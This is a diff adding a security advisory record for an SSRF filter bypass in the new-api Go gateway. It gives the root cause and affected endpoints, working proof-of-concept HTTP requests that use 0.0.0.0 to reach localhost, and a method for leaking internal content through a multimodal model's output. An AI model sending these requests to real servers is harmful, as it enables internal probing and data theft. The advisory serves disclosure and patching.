@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-v5c3-6wvc-pc2q",
+  "modified": "2026-05-06T17:32:45.885429Z",
+  "published": "2026-05-06T17:23:21Z",
+  "aliases": [
+    "CVE-2026-42339"
+  ],
+  "summary": "QuantumNous/new-api has an SSRF Filter Bypass via 0.0.0.0",
+  "details": "# SSRF Filter Bypass via `0.0.0.0` \n\n### Summary\n\nThe SSRF protection introduced in v0.9.0.5 (CVE-2025-59146) and hardened in v0.9.6 (CVE-2025-62155) does not block the unspecified address `0.0.0.0`. A regular (non-admin) user holding any valid API token can send a multimodal request to `/v1/chat/completions`, `/v1/responses`, or `/v1/messages` with `0.0.0.0` as the image/file URL host, bypassing the private-IP filter and causing the server to issue HTTP requests to localhost. This constitutes at minimum a **blind SSRF**; when the request is routed through an AWS/Bedrock Claude adaptor, the fetched content is inlined into the model response, upgrading it to a **full-read SSRF**.\n\n### Details\n\n#### Root Cause\n\n`common/ssrf_protection.go` — `isPrivateIP()` (lines 33–47) checks the following ranges:\n\n- `10.0.0.0/8`\n- `172.16.0.0/12`\n- `192.168.0.0/16`\n- `127.0.0.0/8`\n- `169.254.0.0/16`\n- `224.0.0.0/4`\n- `240.0.0.0/4`\n\n**`0.0.0.0/8` is not checked.** On Linux, `0.0.0.0` resolves to the local machine, same as `127.0.0.1`.\n\n#### Default Fetch Settings\n\n`setting/system_setting/fetch_setting.go` (lines 16–24) defaults:\n\n- `EnableSSRFProtection: true`\n- `AllowPrivateIp: false`\n- `AllowedPorts: [\"80\", \"443\", \"8080\", \"8443\"]`\n- `ApplyIPFilterForDomain: true`\n\nSo `0.0.0.0` on any of these four ports passes all checks.\n\n#### Data Flow (primary chain — `/v1/chat/completions`)\n\n```\nUser API token\n→ /v1/chat/completions  (TokenAuth, no admin required)\n→ messages[].content[].image_url.url = \"http://0.0.0.0:8080/...\"\n→ dto/openai_request.go:111-117   createFileSource() recognises http(s):// as URL source\n→ dto/openai_request.go:119-198   GetTokenCountMeta() collects image_url.url / file.file_data / video_url\n→ service/token_counter.go:237-264 LoadFileSource() fetches URL when shouldFetchFiles == true\n→ service/file_service.go:135-143  loadFromURL() → DoDownloadRequest()\n→ service/download.go:52-68       ValidateURLWithFetchSetting() → 0.0.0.0 NOT blocked → GetHttpClient().Get()\n→ Server issues real TCP connection to 0.0.0.0\n```\n\n**Note on stream requirement:** `common/init.go` (lines 140–141) defaults `GET_MEDIA_TOKEN=true` but `GET_MEDIA_TOKEN_NOT_STREAM=false`, so `stream: true` is needed to trigger the fetch path.\n\n#### Additional Affected Endpoints\n\nThe same `ValidateURLWithFetchSetting()` → `DoDownloadRequest()` sink is reachable from:\n\n| Endpoint | User-controlled field | Auth required |\n|---|---|---|\n| `/v1/chat/completions` | `image_url.url`, `file.file_data`, `video_url` | Regular user token |\n| `/v1/responses` | `input_file.file_url`, `input_image.image_url` | Regular user token |\n| `/v1/messages` | `source.url` (type: `\"url\"`) | Regular user token |\n| `/api/user/setting` | `webhook_url`, `bark_url`, `gotify_url` | Regular user (self) |\n\n#### Upgrade to Full-Read SSRF (conditional)\n\n`relay/channel/aws/adaptor.go` (lines 41–61) — `ConvertClaudeRequest()`:\n\n- If the request is routed to an AWS/Bedrock Claude channel, the adaptor iterates over message content\n- When `source.type == \"url\"`, it calls `service.GetBase64Data()` which invokes the same `DoDownloadRequest()` path\n- The fetched content is rewritten to `type: \"base64\"` and inlined into the model request\n- The model then describes/transcribes the content in its response\n\nThis means an attacker can read the actual content of internal resources (images, PDFs, text) through the model's output, not just detect open/closed ports.\n\n### Proof of Concept\n\n**Prerequisites:** A regular user account with a valid API token. No admin privileges required.\n\n**Step 1 — Control group: `127.0.0.1` is blocked**\n\n```http\nPOST /v1/chat/completions HTTP/1.1\nHost: \u003credacted\u003e\nAuthorization: Bearer sk-\u003cuser-token\u003e\nContent-Type: application/json\n\n{\n  \"model\": \"gpt-4o-mini\",\n  \"stream\": true,\n  \"max_tokens\": 1,\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\"type\": \"text\", \"text\": \"describe\"},\n        {\n          \"type\": \"image_url\",\n          \"image_url\": {\n            \"url\": \"http://127.0.0.1:8080/probe.png\",\n            \"detail\": \"low\"\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\nResponse:\n\n```\nprivate IP address not allowed: 127.0.0.1\n```\n\n**Step 2 — Experiment group: `0.0.0.0` bypasses the filter**\n\n```http\nPOST /v1/chat/completions HTTP/1.1\nHost: \u003credacted\u003e\nAuthorization: Bearer sk-\u003cuser-token\u003e\nContent-Type: application/json\n\n{\n  \"model\": \"gpt-4o-mini\",\n  \"stream\": true,\n  \"max_tokens\": 1,\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\"type\": \"text\", \"text\": \"describe\"},\n        {\n          \"type\": \"image_url\",\n          \"image_url\": {\n            \"url\": \"http://0.0.0.0:8080/probe.png\",\n            \"detail\": \"low\"\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\nResponse:\n\n```\ndial tcp 0.0.0.0:8080: connect: connection refused\n```\n\nThe server attempted a real TCP connection — the SSRF filter was bypassed.\n\n**Step 3 — Confirm readback capability via multimodal model**\n\n```http\nPOST /v1/chat/completions HTTP/1.1\nHost: \u003credacted\u003e\nAuthorization: Bearer sk-\u003cuser-token\u003e\nContent-Type: application/json\n\n{\n  \"model\": \"claude-3-5-sonnet-latest\",\n  \"stream\": false,\n  \"max_tokens\": 32,\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\n          \"type\": \"text\",\n          \"text\": \"Transcribe exactly the text in the image. Output only the text.\"\n        },\n        {\n          \"type\": \"image_url\",\n          \"image_url\": {\n            \"url\": \"https://dummyimage.com/600x180/111/fff.png\u0026text=READBACK-OK-314159\",\n            \"detail\": \"low\"\n          }\n        }\n      ]\n    }\n  ]\n}\n```\n\nResponse:\n\n```json\n{\"choices\":[{\"message\":{\"content\":\"READBACK-OK-314159\"}}]}\n```\n\nThis confirms that when the fetch target returns readable content (image/PDF/text), the model's response leaks that content to the attacker. Combining Step 2 and Step 3: if an internal service on `0.0.0.0:\u003callowed-port\u003e` returns image or document content, an attacker can exfiltrate it.\n\n### Impact\n\nAn authenticated regular user (no admin privileges) can:\n\n1. **Probe localhost and internal services** — Determine open/closed ports on the server by observing `connection refused` vs timeout vs HTTP-level errors. Default allowed ports are 80, 443, 8080, and 8443.\n2. **Exfiltrate internal content** — When the request routes through a multimodal model (especially AWS/Bedrock Claude), the server fetches the resource and the model returns its content (OCR for images, summarization for PDFs/text).\n3. **Bypass all previous SSRF mitigations** — This is a direct bypass of the `isPrivateIP()` check. No redirect chain, no DNS rebinding, no race condition required — just replacing `127.0.0.1` with `0.0.0.0`.\n\nSince user registration is often enabled by default, any registered user can exploit this.\n\n### Suggested Fix\n\n1. Add `0.0.0.0/8` to the deny list in `isPrivateIP()` (`common/ssrf_protection.go`)\n2. Audit against the full [[IANA IPv4 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv4-special-registry/)](https://www.iana.org/assignments/iana-ipv4-special-registry/) — also ensure coverage for:\n   - `0.0.0.0/8` (\"This network\")\n   - `100.64.0.0/10` (Carrier-grade NAT)\n   - `198.18.0.0/15` (Benchmarking)\n   - IPv6 equivalents: `::1`, `::`, `[::]`, `fe80::/10`\n3. Apply the same IP validation to post-redirect targets (already partially addressed in `service/http_client.go:24-33`, but does not help when the initial address itself bypasses the filter)\n\n### Resources\n\n- **CVE-2025-59146** (GHSA-xxv6-m6fx-vfhh): Original authenticated SSRF, patched in v0.9.0.5\n- **CVE-2025-62155** (GHSA-9f46-w24h-69w4): 302 redirect bypass of the SSRF fix, patched in v0.9.6",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/QuantumNous/new-api",
+        "purl": "pkg:golang/github.com/QuantumNous/new-api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.11.9-alpha.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-v5c3-6wvc-pc2q/GHSA-v5c3-6wvc-pc2q.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/QuantumNous/new-api/security/advisories/GHSA-v5c3-6wvc-pc2q"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/QuantumNous/new-api"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-9f46-w24h-69w4"
+    }
+  ]
+}
